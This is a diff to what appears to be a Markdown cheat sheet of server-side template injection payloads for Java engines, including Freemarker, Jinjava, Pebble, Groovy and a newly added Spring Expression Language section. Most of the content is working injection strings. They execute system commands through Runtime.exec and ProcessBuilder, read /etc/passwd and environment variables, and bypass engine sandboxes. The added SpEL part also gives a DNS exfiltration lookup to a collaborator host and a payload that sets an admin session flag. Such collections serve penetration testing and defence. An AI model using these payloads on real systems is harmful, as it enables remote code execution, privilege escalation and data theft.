@@ -7,29 +7,33 @@
 
 - [Templating Libraries](#templating-libraries)
 - [Java](#java)
-    - [Java - Basic injection](#java---basic-injection)
-    - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
+    - [Java - Basic Injection](#java---basic-injection)
+    - [Java - Retrieve Environment Variables](#java---retrieve-environment-variables)
     - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
 - [Freemarker](#freemarker)
-    - [Freemarker - Basic injection](#freemarker---basic-injection)
+    - [Freemarker - Basic Injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
-    - [Freemarker - Code execution](#freemarker---code-execution)
-    - [Freemarker - Sandbox bypass](#freemarker---sandbox-bypass)
+    - [Freemarker - Code Execution](#freemarker---code-execution)
+    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
 - [Codepen](#codepen)
 - [Jinjava](#jinjava)
-    - [Jinjava - Basic injection](#jinjava---basic-injection)
-    - [Jinjava - Command execution](#jinjava---command-execution)
+    - [Jinjava - Basic Injection](#jinjava---basic-injection)
+    - [Jinjava - Command Execution](#jinjava---command-execution)
 - [Pebble](#pebble)
-    - [Pebble - Basic injection](#pebble---basic-injection)
-    - [Pebble - Code execution](#pebble---code-execution)
+    - [Pebble - Basic Injection](#pebble---basic-injection)
+    - [Pebble - Code Execution](#pebble---code-execution)
 - [Velocity](#velocity)
-- [Spring](#spring)
 - [Groovy](#groovy)
-    - [Groovy - Basic injection](#groovy---basic-injection)
-    - [Groovy - Read and create File](#groovy---read-and-create-file)
-    - [Groovy - HTTP request:](#groovy---http-request)
+    - [Groovy - Basic Injection](#groovy---basic-injection)
+    - [Groovy - Read File](#groovy---read-file)
+    - [Groovy - HTTP Request:](#groovy---http-request)
     - [Groovy - Command Execution](#groovy---command-execution)
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
+- [Spring Expression Language](#spring-expression-language)
+    - [SpEL - Basic Injection](#spel---basic-injection)
+    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
+    - [SpEL - Session Attributes](#spel---session-attributes)
+    - [SpEL - Command Execution](#spel---command-execution)
 - [References](#references)
 
 
@@ -49,7 +53,7 @@
 
 ## Java
 
-### Java - Basic injection
+### Java - Basic Injection
 
 > Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
 
@@ -61,7 +65,7 @@ ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-### Java - Retrieve the system’s environment variables
+### Java - Retrieve Environment Variables
 
 ```java
 ${T(java.lang.System).getenv()}
@@ -84,7 +88,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
-### Freemarker - Basic injection
+### Freemarker - Basic Injection
 
 The template can be :
 
@@ -99,7 +103,7 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 Convert the returned bytes to ASCII
 ```
 
-### Freemarker - Code execution
+### Freemarker - Code Execution
 
 ```js
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
@@ -109,7 +113,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
 ```
 
-### Freemarker - Sandbox bypass
+### Freemarker - Sandbox Bypass
 
 :warning: only works on Freemarker versions below 2.3.30
 
@@ -146,7 +150,7 @@ ${dwf.newInstance(ec,null)("id")}
 [Official website](https://github.com/HubSpot/jinjava)
 > Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
 
-### Jinjava - Basic injection
+### Jinjava - Basic Injection
 
 ```python
 {{'a'.toUpperCase()}} would result in 'A'
@@ -155,9 +159,9 @@ ${dwf.newInstance(ec,null)("id")}
 
 Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Jinjava - Command execution
+### Jinjava - Command Execution
 
-Fixed by https://github.com/HubSpot/jinjava/pull/230
+Fixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)
 
 ```ps1
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
@@ -177,13 +181,13 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 > Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
 
-### Pebble - Basic injection
+### Pebble - Basic Injection
 
 ```java
 {{ someString.toUPPERCASE() }}
 ```
 
-### Pebble - Code execution
+### Pebble - Code Execution
 
 Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
 
@@ -225,16 +229,6 @@ $str.valueOf($chr.toChars($out.read()))
 
 ---
 
-
-## Spring
-
-```python
-*{7*7}
-*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
-```
-
----
-
 ## Groovy
 
 [Official website](https://groovy-lang.org/)
@@ -243,7 +237,7 @@ $str.valueOf($chr.toChars($out.read()))
 
 Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.
 
-### Groovy - Read and create File
+### Groovy - Read File
 
 ```groovy
 ${String x = new File('c:/windows/notepad.exe').text}
@@ -251,7 +245,7 @@ ${String x = new File('/path/to/file').getText('UTF-8')}
 ${new File("C:\Temp\FileName.txt").createNewFile();}
 ```
 
-### Groovy - HTTP request:
+### Groovy - HTTP Request
 
 ```groovy
 ${"http://www.google.com".toURL().text}
@@ -280,6 +274,74 @@ or
 ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
 ```
 
+---
+
+## Spring Expression Language
+
+[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)
+
+> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.
+
+### SpEL - Basic Injection
+
+```java
+${7*7}
+${'patt'.toString().replace('a', 'x')}
+```
+
+
+### SpEL - DNS Exfiltration
+
+DNS lookup
+
+```java
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
+```
+
+
+### SpEL - Session Attributes
+
+Modify session attributes
+
+```java
+${pageContext.request.getSession().setAttribute("admin",true)}
+```
+
+
+### SpEL - Command Execution
+
+* Method using `java.lang.Runtime` #1 - accessed with JavaClass
+    ```java
+    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
+    ```
+
+* Method using `java.lang.Runtime` #2
+    ```java
+    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
+    #{session.getAttribute("rtc").setAccessible(true)}
+    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
+    ```
+
+* Method using `java.lang.Runtime` #3 - accessed with `invoke`
+    ```java
+    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
+    ```
+
+* Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
+    ```java
+    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+    ```
+
+* Method using `java.lang.ProcessBuilder`
+    ```java
+    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
+    ${request.getAttribute("c").add("cmd.exe")}
+    ${request.getAttribute("c").add("/k")}
+    ${request.getAttribute("c").add("ping x.x.x.x")}
+    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
+    ${request.getAttribute("a")}
+    ```
+
 
 ## References
 
@@ -288,3 +350,10 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 - [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
 - [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
 - [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
+- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
+- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
+- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
+- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
+- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
+- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
